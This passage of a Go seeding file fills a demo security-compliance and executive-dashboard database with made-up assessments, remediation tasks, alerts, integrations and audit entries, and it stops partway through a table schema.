			verifiedBy = "compliance-team@corp.com"
		}
		expiresAt := createdAt.Add(365 * 24 * time.Hour)
		mustExec(db, `INSERT INTO fce_evidence
			(tenant_id, evidence_id, framework_id, control_id, name, evidence_type, file_name, source, uploaded_by, verified, verified_by, verified_at, expires_at, tags, created_at, updated_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,'[]',$14,$14)
			ON CONFLICT (evidence_id) DO NOTHING`,
			tid, e.eid, e.fid, fceNullStrSeed(e.cid), e.name, e.etype, e.fname, e.source, e.uploader,
			e.verified, verifiedBy, verifiedAt, expiresAt, createdAt,
		)
	}

	// ── assessments ───────────────────────────────────────────────────────────
	type assessRow struct {
		aid, fid, fname, atype, actor string
		total, passed, failed, na     int
		score                          int
		daysAgo                        int
	}
	assessments := []assessRow{
		{"ASS-001", "ISO-27001", "ISO/IEC 27001:2022", "scheduled", "system", 114, 82, 24, 8, 78, 7},
		{"ASS-002", "NIST-CSF", "NIST Cybersecurity Framework", "manual", "alice.zhang@corp.com", 98, 71, 18, 9, 74, 3},
		{"ASS-003", "PCI-DSS", "PCI DSS v4.0", "scheduled", "system", 264, 183, 62, 19, 71, 5},
		{"ASS-004", "CIS-AWS", "CIS Amazon Web Services Foundations", "automated", "bob.patel@corp.com", 97, 84, 8, 5, 88, 4},
		{"ASS-005", "CIS-CONTROLS", "CIS Controls v8", "manual", "alice.zhang@corp.com", 153, 128, 15, 10, 85, 14},
		{"ASS-006", "SOC2-TYPE2", "SOC 2 Type II", "manual", "carol.kim@corp.com", 64, 42, 16, 6, 69, 21},
		{"ASS-007", "GDPR", "GDPR", "manual", "carol.kim@corp.com", 99, 71, 22, 6, 74, 6},
		{"ASS-008", "HIPAA", "HIPAA Security Rule", "scheduled", "system", 54, 48, 5, 1, 90, 12},
	}

	for _, a := range assessments {
		startedAt := now.Add(-time.Duration(a.daysAgo) * 24 * time.Hour)
		completedAt := startedAt.Add(2 * time.Hour)
		mustExec(db, `INSERT INTO fce_assessments
			(tenant_id, assessment_id, framework_id, framework_name, assessment_type, status, started_by, started_at, completed_at, total_controls, passed, failed, not_applicable, not_assessed, score, created_at)
			VALUES ($1,$2,$3,$4,$5,'completed',$6,$7,$8,$9,$10,$11,$12,0,$13,$7)
			ON CONFLICT (assessment_id) DO NOTHING`,
			tid, a.aid, a.fid, a.fname, a.atype, a.actor,
			startedAt, completedAt, a.total, a.passed, a.failed, a.na, a.score,
		)
	}

	// ── remediations ──────────────────────────────────────────────────────────
	type remedRow struct {
		rid, fid, cid, cname, title, priority, status, assignee, team string
		daysUntilDue                                                    int
		createdBy                                                        string
		daysAgo                                                          int
	}
	remeds := []remedRow{
		{"REM-001", "ISO-27001", "A.8.2", "Privileged Access Rights", "Implement PAM solution for privileged access control", "critical", "in_progress", "alice.zhang@corp.com", "Security Ops", 14, "alice.zhang@corp.com", 10},
		{"REM-002", "PCI-DSS", "6.4.3", "Payment page script integrity validated", "Deploy Content Security Policy and script SRI attributes on payment pages", "critical", "open", "bob.patel@corp.com", "Dev Team", 7, "carol.kim@corp.com", 5},
		{"REM-003", "PCI-DSS", "11.3.1", "External penetration test performed", "Schedule and complete annual external penetration test by QSA-approved vendor", "critical", "in_progress", "carol.kim@corp.com", "Compliance", 30, "alice.zhang@corp.com", 15},
		{"REM-004", "ISO-27001", "A.8.8", "Management of Technical Vulnerabilities", "Reduce unpatched critical CVEs from 23 to 0 within 30 days", "critical", "in_progress", "bob.patel@corp.com", "Infra Team", 20, "bob.patel@corp.com", 8},
		{"REM-005", "ISO-27001", "A.5.34", "Privacy and Protection of PII", "Implement data classification and PII masking across all data pipelines", "high", "open", "carol.kim@corp.com", "Privacy Team", 45, "carol.kim@corp.com", 3},
		{"REM-006", "ISO-27001", "A.8.12", "Data Leakage Prevention", "Deploy DLP solution covering email, web, and endpoint channels", "high", "in_review", "alice.zhang@corp.com", "Security Ops", -5, "alice.zhang@corp.com", 30},
		{"REM-007", "NIST-CSF", "RS.CO-3", "Information shared consistent with response plans", "Conduct incident communication tabletop exercise with all stakeholders", "high", "open", "alice.zhang@corp.com", "Security Ops", 21, "alice.zhang@corp.com", 7},
		{"REM-008", "ISO-27001", "A.8.28", "Secure Coding", "Integrate SAST/DAST scanning into CI/CD pipeline; train dev team on OWASP Top 10", "medium", "in_progress", "bob.patel@corp.com", "Dev Team", 60, "bob.patel@corp.com", 20},
		{"REM-009", "NIST-CSF", "PR.IP-9", "Response plans in place", "Update and test incident response plan — last test was 14 months ago", "high", "open", "alice.zhang@corp.com", "Security Ops", 30, "carol.kim@corp.com", 5},
		{"REM-010", "SOC2-TYPE2", "", "Availability Trust Service", "Implement automated failover for 3 single points of failure identified in SOC 2 gap assessment", "high", "open", "carol.kim@corp.com", "Infra Team", 45, "carol.kim@corp.com", 14},
		{"REM-011", "PCI-DSS", "8.3.1", "User identities confirmed before account creation", "Integrate PAM with HR system for automated joiner/mover/leaver process", "medium", "verified", "alice.zhang@corp.com", "Security Ops", -30, "alice.zhang@corp.com", 90},
		{"REM-012", "GDPR", "data_transfer", "International Data Transfer", "Update SCCs for EU-US data transfers following latest EDPB guidance", "high", "closed", "carol.kim@corp.com", "Legal", -60, "carol.kim@corp.com", 120},
	}

	for _, r := range remeds {
		createdAt := now.Add(-time.Duration(r.daysAgo) * 24 * time.Hour)
		dueDate := now.Add(time.Duration(r.daysUntilDue) * 24 * time.Hour)
		var closedAt interface{}
		if r.status == "closed" || r.status == "verified" {
			cat := now.Add(-5 * 24 * time.Hour)
			closedAt = cat
		}
		mustExec(db, `INSERT INTO fce_remediations
			(tenant_id, remediation_id, framework_id, control_id, control_name, title, priority, status, assigned_to, assigned_team, due_date, verification_status, closed_at, created_by, created_at, updated_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$15)
			ON CONFLICT (remediation_id) DO NOTHING`,
			tid, r.rid, r.fid, r.cid, r.cname, r.title, r.priority, r.status,
			r.assignee, r.team, dueDate.Format("2006-01-02"),
			"unverified", closedAt, r.createdBy, createdAt,
		)
	}

	// ── notifications ─────────────────────────────────────────────────────────
	type notifRow struct {
		etype, title, msg, sev, fid string
		read                          bool
		minsAgo                       int
	}
	notifs := []notifRow{
		{"assessment_completed", "PCI DSS Assessment Completed", "PCI DSS v4.0 assessment completed — score: 71%. 3 critical controls failing.", "high", "PCI-DSS", false, 10},
		{"control_failed", "Critical Control Failure: Payment Page Scripts", "PCI DSS 6.4.3 — Script integrity validation missing on checkout pages. Immediate action required.", "critical", "PCI-DSS", false, 10},
		{"control_failed", "Critical Control Failure: External Pen Test Overdue", "Annual penetration test 47 days overdue. QSA audit at risk.", "critical", "PCI-DSS", false, 30},
		{"assessment_completed", "ISO 27001 Assessment Completed", "ISO 27001 assessment completed — score: 78% (↑4% from last quarter).", "info", "ISO-27001", false, 60},
		{"remediation_overdue", "Remediation Task Overdue", "REM-006: DLP deployment is 5 days overdue. Assigned to alice.zhang@corp.com.", "high", "ISO-27001", true, 1440},
		{"framework_added", "New Framework: ENS Added", "Spanish National Security Framework (ENS) 2022 added to framework library.", "info", "ENS", true, 2880},
		{"assessment_completed", "NIST CSF Assessment Completed", "NIST CSF assessment completed — score: 74%. Respond function below target at 48%.", "medium", "NIST-CSF", true, 240},
		{"evidence_expiring", "Evidence Expiring Soon", "3 evidence items expiring within 30 days. Review and renew before audit.", "medium", "", true, 720},
		{"assessment_completed", "CIS AWS Assessment Completed", "CIS AWS Foundations Benchmark — score: 88%. Excellent cloud security posture.", "info", "CIS-AWS", true, 360},
		{"control_remediated", "Control Remediated: PAN Masking", "PCI DSS 3.4 — PAN masking implementation verified. Control status: Passed.", "info", "PCI-DSS", true, 10080},
	}

	for _, n := range notifs {
		createdAt := now.Add(-time.Duration(n.minsAgo) * time.Minute)
		mustExec(db, `INSERT INTO fce_notifications (tenant_id, event_type, title, message, severity, framework_id, read, created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8)`,
			tid, n.etype, n.title, n.msg, n.sev, fceNullStrSeed(n.fid), n.read, createdAt,
		)
	}

	// ── audit trail ───────────────────────────────────────────────────────────
	type auditRow struct {
		action, otype, oid, oname, actor, details string
		minsAgo                                    int
	}
	auditEntries := []auditRow{
		{"assessment_completed", "assessment", "ASS-003", "PCI DSS v4.0", "system", "Score: 71%, Passed: 183, Failed: 62", 10},
		{"assessment_completed", "assessment", "ASS-002", "NIST Cybersecurity Framework", "alice.zhang@corp.com", "Score: 74%, Passed: 71, Failed: 18", 240},
		{"assessment_completed", "assessment", "ASS-001", "ISO/IEC 27001:2022", "system", "Score: 78%, Passed: 82, Failed: 24", 10080},
		{"control_modified", "control", "A.8.2", "Privileged Access Rights", "alice.zhang@corp.com", "Framework: ISO-27001, Status changed: not_assessed → failed", 14400},
		{"evidence_uploaded", "evidence", "EVD-008", "MFA Enrollment Report — July 2025", "alice.zhang@corp.com", "Framework: NIST-CSF, Control: PR.AC-1, Type: report", 1440},
		{"evidence_uploaded", "evidence", "EVD-007", "Audit Log Samples — June 2025", "bob.patel@corp.com", "Framework: PCI-DSS, Control: 10.2, Type: log", 2880},
		{"remediation_created", "remediation", "REM-002", "Deploy CSP and SRI on payment pages", "carol.kim@corp.com", "Control: 6.4.3, Priority: critical", 7200},
		{"remediation_created", "remediation", "REM-001", "Implement PAM solution", "alice.zhang@corp.com", "Control: A.8.2, Priority: critical", 14400},
		{"framework_added", "framework", "ENS", "Spanish National Security Framework (ENS)", "carol.kim@corp.com", "Category: security, Version: 2022", 40320},
		{"framework_added", "framework", "CUSTOM-DEVOPS", "Internal DevSecOps Framework", "bob.patel@corp.com", "Category: custom, Version: 1.2", 43200},
		{"control_modified", "control", "A.5.24", "Incident Response Plan — reviewed", "alice.zhang@corp.com", "Framework: ISO-27001, Status: passed, Evidence attached", 10080},
		{"remediation_updated", "remediation", "REM-012", "SCCs for EU-US data transfers — CLOSED", "carol.kim@corp.com", "Status: open → closed", 86400},
		{"assessment_completed", "assessment", "ASS-008", "HIPAA Security Rule", "system", "Score: 90%, Passed: 48, Failed: 5", 17280},
		{"control_modified", "control", "PR.IP-9", "Response plans — gap identified", "alice.zhang@corp.com", "Framework: NIST-CSF, Status: passed → failed", 10080},
		{"evidence_uploaded", "evidence", "EVD-015", "Information Security Policy v4.1", "alice.zhang@corp.com", "Framework: ISO-27001, Control: A.5.1, Type: document", 259200},
	}

	for _, a := range auditEntries {
		createdAt := now.Add(-time.Duration(a.minsAgo) * time.Minute)
		mustExec(db, `INSERT INTO fce_audit (tenant_id, action, object_type, object_id, object_name, actor, details, created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8)`,
			tid, a.action, a.otype, a.oid, a.oname, a.actor, a.details, createdAt,
		)
	}

	log.Printf("FCE seed: %d frameworks, %d controls, %d evidence, %d assessments, %d remediations, %d notifications, %d audit",
		len(frameworks), len(controls), len(evidences), len(assessments), len(remeds), len(notifs), len(auditEntries))
}

func fceNullStrSeed(s string) interface{} {
	if s == "" { return nil }
	return s
}

func seedExecutiveEnterprise(db *sql.DB) {
	tid := 9999
	now := time.Now()

	// tables
	for _, q := range []string{
		`CREATE TABLE IF NOT EXISTS exe_snapshots (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
			snapshot_date DATE NOT NULL,
			security_score INTEGER DEFAULT 0, risk_score INTEGER DEFAULT 0,
			compliance_score INTEGER DEFAULT 0, total_incidents INTEGER DEFAULT 0,
			critical_incidents INTEGER DEFAULT 0, total_vulns INTEGER DEFAULT 0,
			critical_vulns INTEGER DEFAULT 0, total_assets INTEGER DEFAULT 0,
			critical_assets INTEGER DEFAULT 0, mttd_hours NUMERIC(8,2) DEFAULT 0,
			mttr_hours NUMERIC(8,2) DEFAULT 0, sla_compliance INTEGER DEFAULT 0,
			patch_compliance INTEGER DEFAULT 0, detection_coverage INTEGER DEFAULT 0,
			automation_rate INTEGER DEFAULT 0, false_positive_rate NUMERIC(6,2) DEFAULT 0,
			financial_risk_usd BIGINT DEFAULT 0,
			created_at TIMESTAMP DEFAULT NOW(), UNIQUE(tenant_id, snapshot_date))`,
		`CREATE TABLE IF NOT EXISTS exe_forecasts (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
			forecast_date DATE NOT NULL, metric TEXT NOT NULL,
			predicted_value NUMERIC(12,2) DEFAULT 0,
			confidence_low NUMERIC(12,2) DEFAULT 0, confidence_high NUMERIC(12,2) DEFAULT 0,
			model TEXT DEFAULT 'linear', created_at TIMESTAMP DEFAULT NOW(),
			UNIQUE(tenant_id, forecast_date, metric))`,
		`CREATE TABLE IF NOT EXISTS exe_reports (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
			report_id TEXT NOT NULL UNIQUE, title TEXT NOT NULL,
			report_type TEXT NOT NULL DEFAULT 'executive_summary',
			generated_by TEXT NOT NULL, security_score INTEGER DEFAULT 0,
			risk_score INTEGER DEFAULT 0, summary TEXT,
			key_findings TEXT DEFAULT '[]', recommendations TEXT DEFAULT '[]',
			format TEXT DEFAULT 'pdf', size_bytes BIGINT DEFAULT 0,
			shared_with TEXT DEFAULT '[]', created_at TIMESTAMP DEFAULT NOW())`,
		`CREATE TABLE IF NOT EXISTS exe_notifications (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
			event_type TEXT NOT NULL, title TEXT NOT NULL, message TEXT NOT NULL,
			severity TEXT NOT NULL DEFAULT 'info', source TEXT,
			action_url TEXT, read BOOLEAN DEFAULT FALSE,
			created_at TIMESTAMP DEFAULT NOW())`,
		`CREATE TABLE IF NOT EXISTS exe_integrations (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
			integration_id TEXT NOT NULL UNIQUE, name TEXT NOT NULL,
			category TEXT NOT NULL, status TEXT NOT NULL DEFAULT 'active',
			last_sync_at TIMESTAMP, records_synced BIGINT DEFAULT 0,
			health_score INTEGER DEFAULT 100, error_count INTEGER DEFAULT 0,
			config_summary TEXT, created_at TIMESTAMP DEFAULT NOW(),
			updated_at TIMESTAMP DEFAULT NOW())`,
		`CREATE TABLE IF NOT EXISTS exe_audit (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
			action TEXT NOT NULL, object_type TEXT NOT NULL,
			object_id TEXT, object_name TEXT, actor TEXT NOT NULL,
			ip_address TEXT, details TEXT, created_at TIMESTAMP DEFAULT NOW())`,
	} {
		mustExec(db, q)
	}

	// 90 days of snapshots (trending data)
	type snapRow struct {
		sec, risk, comp, inc, critInc, vulns, critVulns, assets, critAssets int
		mttd, mttr, falsePos                                                 float64
		sla, patch, detCov, autoRate                                         int
		finRisk                                                               int64
	}
	// Start values and end values for linear interpolation
	start := snapRow{68, 81, 69, 24, 6, 478, 71, 3248, 149, 6.1, 18.4, 4.2, 71, 72, 71, 52, 5_800_000}
	end := snapRow{73, 68, 74, 9, 4, 354, 47, 3448, 161, 3.2, 14.8, 3.1, 91, 82, 84, 64, 4_930_000}

	lerp := func(a, b, t float64) float64 { return a + (b-a)*t }
	lerpi := func(a, b int, t float64) int { return int(lerp(float64(a), float64(b), t)) }
	lerpl := func(a, b int64, t float64) int64 { return int64(lerp(float64(a), float64(b), t)) }

	for i := 90; i >= 0; i-- {
		d := now.AddDate(0, 0, -i)
		t := float64(90-i) / 90.0
		noise := float64(i%7) - 3 // small zig-zag

		secS := lerpi(start.sec, end.sec, t) + int(noise*0.5)
		riskS := lerpi(start.risk, end.risk, t) + int(noise*0.3)
		compS := lerpi(start.comp, end.comp, t)
		incS := lerpi(start.inc, end.inc, t) + int(noise*0.4)
		critI := lerpi(start.critInc, end.critInc, t)
		vulnS := lerpi(start.vulns, end.vulns, t) + int(noise)*2
		critV := lerpi(start.critVulns, end.critVulns, t)
		assetS := lerpi(start.assets, end.assets, t)
		critA := lerpi(start.critAssets, end.critAssets, t)
		mttd := lerp(start.mttd, end.mttd, t) + noise*0.1
		mttr := lerp(start.mttr, end.mttr, t) + noise*0.2
		sla := lerpi(start.sla, end.sla, t)
		patch := lerpi(start.patch, end.patch, t)
		detCov := lerpi(start.detCov, end.detCov, t)
		auto := lerpi(start.autoRate, end.autoRate, t)
		fp := lerp(start.falsePos, end.falsePos, t)
		fin := lerpl(start.finRisk, end.finRisk, t)

		mustExec(db, `INSERT INTO exe_snapshots
			(tenant_id,snapshot_date,security_score,risk_score,compliance_score,
			 total_incidents,critical_incidents,total_vulns,critical_vulns,
			 total_assets,critical_assets,mttd_hours,mttr_hours,sla_compliance,
			 patch_compliance,detection_coverage,automation_rate,false_positive_rate,financial_risk_usd)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19)
			ON CONFLICT (tenant_id,snapshot_date) DO NOTHING`,
			tid, d.Format("2006-01-02"),
			secS, riskS, compS, incS, critI, vulnS, critV,
			assetS, critA, mttd, mttr, sla, patch, detCov, auto, fp, fin,
		)
	}

	// 30-day forecast
	metrics := []struct{ name string; base, delta float64 }{
		{"risk_score",    68, 1.8},
		{"incidents",     9,  0.5},
		{"critical_vulns",47, 2.1},
		{"compliance",    74, 0.3},
		{"patch_backlog", 354,4.5},
	}
	for _, m := range metrics {
		for day := 1; day <= 30; day++ {
			fdate := now.AddDate(0, 0, day)
			val := m.base + m.delta*float64(day)
			mustExec(db, `INSERT INTO exe_forecasts
				(tenant_id,forecast_date,metric,predicted_value,confidence_low,confidence_high)
				VALUES ($1,$2,$3,$4,$5,$6) ON CONFLICT (tenant_id,forecast_date,metric) DO NOTHING`,
				tid, fdate.Format("2006-01-02"), m.name,
				val, val*0.85, val*1.15,
			)
		}
	}

	// pre-generated reports
	type rptRow struct {
		rid, title, rtype, by, format string
		sec, risk                      int
		daysAgo                         int
		sizeKB                          int
	}
	reports := []rptRow{
		{"EXE-RPT-001", "Monthly Executive Security Briefing — June 2025", "executive_summary", "carol.kim@corp.com", "pdf", 73, 68, 1, 420},
		{"EXE-RPT-002", "Q2 2025 Board Security Report", "board_report", "alice.zhang@corp.com", "pdf", 71, 72, 7, 890},
		{"EXE-RPT-003", "Weekly Security Briefing — W28 2025", "weekly_briefing", "system", "pdf", 74, 67, 3, 210},
		{"EXE-RPT-004", "Business Risk Analysis — July 2025", "risk_analysis", "carol.kim@corp.com", "pdf", 73, 68, 0, 540},
		{"EXE-RPT-005", "Q2 2025 KPI Dashboard Report", "kpi_dashboard", "alice.zhang@corp.com", "pdf", 70, 74, 30, 330},
		{"EXE-RPT-006", "Compliance Summary — H1 2025", "compliance_summary", "carol.kim@corp.com", "pdf", 74, 69, 14, 650},
		{"EXE-RPT-007", "Annual Security Report 2024", "annual_report", "alice.zhang@corp.com", "pdf", 65, 78, 180, 1250},
		{"EXE-RPT-008", "Q3 2025 Quarterly Security Review", "quarterly_review", "system", "pdf", 73, 68, 0, 720},
	}
	for _, r := range reports {
		createdAt := now.AddDate(0, 0, -r.daysAgo)
		mustExec(db, `INSERT INTO exe_reports
			(tenant_id,report_id,title,report_type,generated_by,security_score,risk_score,format,size_bytes,created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10)
			ON CONFLICT (report_id) DO NOTHING`,
			tid, r.rid, r.title, r.rtype, r.by, r.sec, r.risk, r.format, int64(r.sizeKB)*1024, createdAt,
		)
	}

	// integrations
	type intRow struct {
		iid, name, cat, status, cfg string
		records                      int64
		health, errors               int
		minsAgo                      int
	}
	integrations := []intRow{
		{"INT-SIEM",    "Splunk Enterprise SIEM",      "siem",           "active",  "Index: main, Lookback: 90d",          14_203_442, 99, 0, 5},
		{"INT-EDR",     "CrowdStrike Falcon EDR",      "edr",            "active",  "1,847 endpoints enrolled",             8_924_331,  98, 0, 3},
		{"INT-SOAR",    "Palo Alto XSOAR",             "soar",           "active",  "47 active playbooks, 1,204 auto-closed",2_341_180, 97, 1, 10},
		{"INT-TI",      "Recorded Future Threat Intel","threat_intel",   "active",  "7 feeds active, 1.2M IOCs",           1_203_445,  100,0, 1},
		{"INT-VULN",    "Tenable.io",                  "vulnerability",  "active",  "3,448 assets scanned",                 354_112,   96, 2, 30},
		{"INT-CMDB",    "ServiceNow CMDB",             "cmdb",           "active",  "3,448 CIs synced",                     3_448,     99, 0, 60},
		{"INT-FIREWALL","Palo Alto Firewall",           "firewall",       "active",  "14 policies, 2,847 rules",            22_341_009, 100,0, 2},
		{"INT-CLOUD",   "AWS Security Hub",            "cloud_security", "active",  "412 cloud assets, 4 accounts",         1_893_445, 97, 1, 15},
		{"INT-COMPLY",  "Framework Compliance Engine",  "compliance",    "active",  "12 frameworks, 1,200+ controls",       12_445,    100,0, 20},
		{"INT-IAM",     "Azure Active Directory",       "iam",           "active",  "4,200 users, 850 groups",              4_200,     98, 0, 5},
		{"INT-TICKET",  "Jira Service Management",      "ticketing",     "active",  "Open: 47 tickets linked",              1_204,     96, 3, 45},
		{"INT-EMAIL",   "Microsoft Defender for O365",  "email_security","degraded","19 blocked campaigns, latency elevated",892_341,  72, 14, 2},
	}
	for _, i := range integrations {
		syncAt := now.Add(-time.Duration(i.minsAgo) * time.Minute)
		mustExec(db, `INSERT INTO exe_integrations
			(tenant_id,integration_id,name,category,status,last_sync_at,records_synced,health_score,error_count,config_summary)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10)
			ON CONFLICT (integration_id) DO NOTHING`,
			tid, i.iid, i.name, i.cat, i.status, syncAt, i.records, i.health, i.errors, i.cfg,
		)
	}

	// notifications
	type notifRow struct {
		etype, title, msg, sev, source string
		read                            bool
		minsAgo                         int
	}
	notifs := []notifRow{
		{"critical_incident",    "CRITICAL: Ransomware Activity Detected",         "LockBit 3.0 IOCs matched on 3 endpoints. Containment in progress.", "critical", "EDR",          false, 15},
		{"sla_breach",           "SLA Breach: P1 Incident — Finance VPN",          "Incident INC-2847 has breached 4-hour P1 SLA. CISO notification required.", "critical", "SOAR",  false, 32},
		{"compliance_failure",   "PCI DSS Critical Control Failure",               "CVE-2024-3400 patch not applied to payment gateway. PCI audit at risk.", "critical", "Compliance", false, 60},
		{"high_risk",            "High Business Risk: Data Exfiltration Attempt",  "Anomalous data transfer detected from Finance workstation to external IP.", "high", "SIEM",         false, 90},
		{"major_breach",         "Phishing Campaign Targeting C-Suite",            "4 targeted phishing emails intercepted. Credentials not compromised.", "high", "Email Security", false, 180},
		{"report_available",     "Board Report Ready: Q2 2025",                    "Quarterly board security report has been generated and is ready for review.", "info", "Reports",  true,  10080},
		{"compliance_milestone", "ISO 27001 Score Improved to 78%",                "Assessment completed — score improved 4 points following patch campaign.", "info", "Compliance",  true,  4320},
		{"integration_error",    "Integration Warning: Email Security Degraded",   "Microsoft Defender for O365 reporting elevated latency. Monitoring.", "medium", "Integration",  true,  120},
		{"kpi_alert",            "MTTR Below SLA Target",                          "Mean Time to Respond is 14.8h, above the 12h executive target. Review required.", "medium", "KPIs", true,  2880},
		{"report_available",     "Weekly Briefing Available — W28 2025",           "Your weekly security briefing has been generated.", "info", "Reports",                              true,  4320},
	}
	for _, n := range notifs {
		createdAt := now.Add(-time.Duration(n.minsAgo) * time.Minute)
		mustExec(db, `INSERT INTO exe_notifications
			(tenant_id,event_type,title,message,severity,source,read,created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8)`,
			tid, n.etype, n.title, n.msg, n.sev, n.source, n.read, createdAt,
		)
	}

	// audit trail
	type auditRow struct {
		action, otype, oid, oname, actor, ip, details string
		minsAgo                                        int
	}
	audits := []auditRow{
		{"dashboard_accessed",  "dashboard", "",          "Executive Dashboard",    "carol.kim@corp.com",   "10.0.1.45",  "Tab: dashboard",                                  2},
		{"report_generated",    "report",    "EXE-RPT-004","Business Risk Analysis","carol.kim@corp.com",   "10.0.1.45",  "Type: risk_analysis, Format: pdf, Size: 540KB",   5},
		{"report_generated",    "report",    "EXE-RPT-003","Weekly Briefing W28",   "system",              "127.0.0.1",  "Scheduled generation — Type: weekly_briefing",     4320},
		{"dashboard_accessed",  "dashboard", "",          "Executive Dashboard",    "alice.zhang@corp.com", "10.0.1.22",  "Tab: threats",                                    60},
		{"report_shared",       "report",    "EXE-RPT-002","Q2 Board Report",       "alice.zhang@corp.com", "10.0.1.22",  "Shared with: board@corp.com, ceo@corp.com",       10080},
		{"report_generated",    "report",    "EXE-RPT-002","Q2 2025 Board Report",  "alice.zhang@corp.com", "10.0.1.22",  "Type: board_report, Size: 890KB",                 10090},
		{"notification_viewed", "notification","",        "Critical Incident Alert","carol.kim@corp.com",   "10.0.1.45",  "Ransomware activity notification acknowledged",    15},
		{"dashboard_accessed",  "dashboard", "",          "Executive Dashboard",    "bob.patel@corp.com",   "10.0.2.11",  "Tab: compliance",                                 180},
		{"report_generated",    "report",    "EXE-RPT-001","Monthly Briefing Jun",  "carol.kim@corp.com",   "10.0.1.45",  "Type: executive_summary, Size: 420KB",            1440},
		{"config_changed",      "dashboard", "FILTER-001","Dashboard Filter",       "alice.zhang@corp.com", "10.0.1.22",  "Default time range changed: 7d → 30d",            2880},
		{"dashboard_accessed",  "dashboard", "",          "Executive Dashboard",    "carol.kim@corp.com",   "10.0.1.45",  "Tab: forecasting",                                720},
		{"report_generated",    "report",    "EXE-RPT-006","Compliance Summary H1", "carol.kim@corp.com",   "10.0.1.45",  "Type: compliance_summary, Size: 650KB",           20160},
	}
	for _, a := range audits {
		createdAt := now.Add(-time.Duration(a.minsAgo) * time.Minute)
		mustExec(db, `INSERT INTO exe_audit
			(tenant_id,action,object_type,object_id,object_name,actor,ip_address,details,created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9)`,
			tid, a.action, a.otype, exeNullStrSeed(a.oid), exeNullStrSeed(a.oname),
			a.actor, a.ip, a.details, createdAt,
		)
	}

	log.Printf("EXE seed: 91 snapshots, 150 forecasts, %d reports, %d integrations, %d notifications, %d audit",
		len(reports), len(integrations), len(notifs), len(audits))
}

func exeNullStrSeed(s string) interface{} {
	if s == "" { return nil }
	return s
}

func seedSOCMetricsEnterprise(db *sql.DB) {
	tid := 9999
	now := time.Now()

	// tables
	for _, q := range []string{
		`CREATE TABLE IF NOT EXISTS sme_snapshots (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, snapshot_date DATE NOT NULL,
			soc_health_score INTEGER DEFAULT 0, active_analysts INTEGER DEFAULT 0,
			analysts_online INTEGER DEFAULT 0, automation_coverage INTEGER DEFAULT 0,
			current_shift TEXT DEFAULT 'day',
			total_alerts INTEGER DEFAULT 0, critical_alerts INTEGER DEFAULT 0,
			high_alerts INTEGER DEFAULT 0, medium_alerts INTEGER DEFAULT 0,
			low_alerts INTEGER DEFAULT 0, suppressed_alerts INTEGER DEFAULT 0,
			false_positives INTEGER DEFAULT 0, escalated_alerts INTEGER DEFAULT 0,
			duplicate_alerts INTEGER DEFAULT 0, alert_queue_size INTEGER DEFAULT 0,
			alert_processing_mins NUMERIC(8,2) DEFAULT 0,
			total_incidents INTEGER DEFAULT 0, critical_incidents INTEGER DEFAULT 0,
			open_incidents INTEGER DEFAULT 0, closed_incidents INTEGER DEFAULT 0,
			mttd_mins NUMERIC(8,2) DEFAULT 0, mtta_mins NUMERIC(8,2) DEFAULT 0,
			mttc_mins NUMERIC(8,2) DEFAULT 0, mttr_mins NUMERIC(8,2) DEFAULT 0,
			mttrec_mins NUMERIC(8,2) DEFAULT 0, sla_compliance INTEGER DEFAULT 0,
			open_cases INTEGER DEFAULT 0, closed_cases INTEGER DEFAULT 0,
			case_backlog INTEGER DEFAULT 0, escalated_cases INTEGER DEFAULT 0,
			reopened_cases INTEGER DEFAULT 0,
			playbook_executions INTEGER DEFAULT 0, automation_success_rate INTEGER DEFAULT 0,
			analyst_hours_saved NUMERIC(8,2) DEFAULT 0,
			script_runner_executions INTEGER DEFAULT 0,
			ioc_hits INTEGER DEFAULT 0, malware_detections INTEGER DEFAULT 0,
			ransomware_detections INTEGER DEFAULT 0, threat_actor_hits INTEGER DEFAULT 0,
			healthy_endpoints INTEGER DEFAULT 0, offline_agents INTEGER DEFAULT 0,
			quarantined_endpoints INTEGER DEFAULT 0, firewall_blocks INTEGER DEFAULT 0,
			network_anomalies INTEGER DEFAULT 0,
			critical_vulns INTEGER DEFAULT 0, high_vulns INTEGER DEFAULT 0,
			patch_compliance INTEGER DEFAULT 0, compliance_score INTEGER DEFAULT 0,
			log_ingestion_rate BIGINT DEFAULT 0, eps INTEGER DEFAULT 0,
			storage_utilization INTEGER DEFAULT 0,
			created_at TIMESTAMP DEFAULT NOW(),
			UNIQUE(tenant_id, snapshot_date))`,

		`CREATE TABLE IF NOT EXISTS sme_analyst_perf (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
			analyst_name TEXT NOT NULL, team TEXT NOT NULL DEFAULT 'SOC',
			shift TEXT NOT NULL DEFAULT 'day', perf_date DATE NOT NULL,
			alerts_investigated INTEGER DEFAULT 0, incidents_resolved INTEGER DEFAULT 0,
			cases_closed INTEGER DEFAULT 0, avg_response_mins NUMERIC(8,2) DEFAULT 0,
			avg_investigation_mins NUMERIC(8,2) DEFAULT 0,
			false_positive_rate NUMERIC(5,2) DEFAULT 0, workload_score INTEGER DEFAULT 0,
			productivity_score INTEGER DEFAULT 0, burnout_index INTEGER DEFAULT 0,
			created_at TIMESTAMP DEFAULT NOW(),
			UNIQUE(tenant_id, analyst_name, perf_date))`,

		`CREATE TABLE IF NOT EXISTS sme_detection_rules (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
			rule_id TEXT NOT NULL UNIQUE, rule_name TEXT NOT NULL,
			rule_type TEXT NOT NULL DEFAULT 'sigma',
			mitre_technique TEXT, mitre_tactic TEXT,
